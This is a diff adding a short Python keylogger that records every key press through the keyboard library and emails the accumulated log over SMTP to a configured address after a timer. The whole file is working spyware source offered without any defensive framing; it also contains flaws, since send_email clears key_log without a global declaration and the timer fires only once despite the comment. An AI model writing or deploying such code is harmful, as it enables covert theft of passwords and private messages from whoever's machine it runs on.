@@ -1,0 +1,41 @@
+import keyboard
+import smtplib
+from threading import Timer
+from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+# Set up your email credentials
+EMAIL_ADDRESS = "your_email@example.com"
+EMAIL_PASSWORD = "your_email_password"
+
+# Initialize the key log
+key_log = ""
+
+def on_key_press(key):
+    global key_log
+    key_log += str(key)
+
+def send_email():
+    msg = MIMEMultipart()
+    msg.attach(MIMEText(key_log, "plain"))
+
+    with smtplib.SMTP("smtp.example.com", 587) as server:
+        server.starttls()
+        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
+
+    # Clear the key log
+    key_log = ""
+
+# Listen to key presses
+keyboard.on_press(on_key_press)
+
+# Send email every N minutes (adjust as needed)
+interval_minutes = 10
+timer = Timer(interval_minutes * 60, send_email)
+timer.start()
+
+# Keep the script running
+keyboard.wait()
+
